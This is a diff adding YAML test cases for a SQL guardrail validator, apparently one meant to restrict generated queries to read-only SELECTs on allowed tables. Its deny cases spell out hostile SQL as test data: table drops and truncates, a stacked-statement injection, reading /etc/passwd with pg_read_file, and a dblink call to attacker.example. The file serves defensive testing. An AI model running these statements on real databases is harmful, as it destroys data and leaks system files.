@@ -1,0 +1,137 @@
+# SQL Guardrail (AST) evaluation cases.
+#
+# verdict:
+#   deny    - the validator must reject the SQL (is_valid=false)
+#   allow   - the validator must accept the SQL (is_valid=true)
+#
+# expected_rules (optional): violation rules that must be among the observed
+# violations for deny cases (exact rule codes from ViolationRule).
+cases:
+  - id: deny_update_statement
+    tags: [dml,security, easy]
+    verdict: deny
+    expected_rules: [SELECT_ONLY]
+    sql: |
+      UPDATE business.customers SET customer_city = 'Hacked' WHERE customer_id = 'x';
+
+  - id: deny_insert_statement
+    tags: [dml,security, easy]
+    verdict: deny
+    expected_rules: [SELECT_ONLY]
+    sql: |
+      INSERT INTO business.orders (order_id, customer_id, order_status, order_purchase_timestamp)
+      VALUES ('attacker', 'attacker', 'created', NOW());
+
+  - id: deny_delete_statement
+    tags: [dml,security, easy]
+    verdict: deny
+    expected_rules: [SELECT_ONLY]
+    sql: |
+      DELETE FROM business.orders WHERE order_status = 'created';
+
+  - id: deny_drop_table
+    tags: [ddl,security, easy]
+    verdict: deny
+    expected_rules: [SELECT_ONLY]
+    sql: |
+      DROP TABLE business.orders;
+
+  - id: deny_truncate_table
+    tags: [ddl,security, medium]
+    verdict: deny
+    sql: |
+      TRUNCATE TABLE business.payments;
+
+  - id: deny_create_table
+    tags: [ddl,security, medium]
+    verdict: deny
+    sql: |
+      CREATE TABLE business.hacked (id INT);
+
+  - id: deny_alter_table
+    tags: [ddl,security, medium]
+    verdict: deny
+    sql: |
+      ALTER TABLE business.orders DROP COLUMN order_status;
+
+  - id: deny_multi_statement_stacked
+    tags: [injection,security, easy]
+    verdict: deny
+    expected_rules: [MULTIPLE_STATEMENTS]
+    sql: |
+      SELECT order_id FROM business.orders; DROP TABLE business.orders;
+
+  - id: deny_select_into
+    tags: [exfiltration,security, hard]
+    verdict: deny
+    expected_rules: [DISALLOWED_OPERATION]
+    sql: |
+      SELECT * INTO local_backup FROM business.orders;
+
+  - id: deny_disallowed_table
+    tags: [allowlist,security, easy]
+    verdict: deny
+    expected_rules: [DISALLOWED_TABLE]
+    sql: |
+      SELECT email FROM app.users;
+
+  - id: deny_pg_sleep_function
+    tags: [dangerous_fn,dos, medium]
+    verdict: deny
+    expected_rules: [DANGEROUS_FUNCTION]
+    sql: |
+      SELECT pg_sleep(100);
+
+  - id: deny_pg_read_file
+    tags: [dangerous_fn,exfiltration, hard]
+    verdict: deny
+    expected_rules: [DANGEROUS_FUNCTION]
+    sql: |
+      SELECT pg_read_file('/etc/passwd');
+
+  - id: deny_dblink_exfiltration
+    tags: [dangerous_fn,exfiltration, hard]
+    verdict: deny
+    expected_rules: [DANGEROUS_FUNCTION]
+    sql: |
+      SELECT dblink('host=attacker.example port=5432 dbname=x', 'SELECT 1');
+
+  - id: allow_simple_count
+    tags: [happy_path,security, easy]
+    verdict: allow
+    sql: |
+      SELECT COUNT(DISTINCT order_id) FROM business.orders;
+
+  - id: allow_join_group_by
+    tags: [happy_path,security, easy]
+    verdict: allow
+    sql: |
+      SELECT c.customer_state, SUM(oi.price) AS total_revenue
+      FROM business.order_items oi
+      JOIN business.orders o ON o.order_id = oi.order_id
+      JOIN business.customers c ON c.customer_id = o.customer_id
+      GROUP BY c.customer_state;
+
+  - id: allow_cte_separate_aggregation
+    tags: [happy_path,security, fan_out, medium]
+    verdict: allow
+    sql: |
+      WITH per_order AS (
+        SELECT order_id, SUM(payment_value) AS paid
+        FROM business.payments
+        GROUP BY order_id
+      )
+      SELECT c.customer_state, SUM(p.paid) AS total_paid
+      FROM per_order p
+      JOIN business.orders o ON o.order_id = p.order_id
+      JOIN business.customers c ON c.customer_id = o.customer_id
+      GROUP BY c.customer_state;
+
+  - id: allow_status_filter
+    tags: [happy_path,security, easy]
+    verdict: allow
+    sql: |
+      SELECT order_status, COUNT(DISTINCT order_id) AS order_count
+      FROM business.orders
+      WHERE order_status IN ('delivered', 'canceled')
+      GROUP BY order_status;
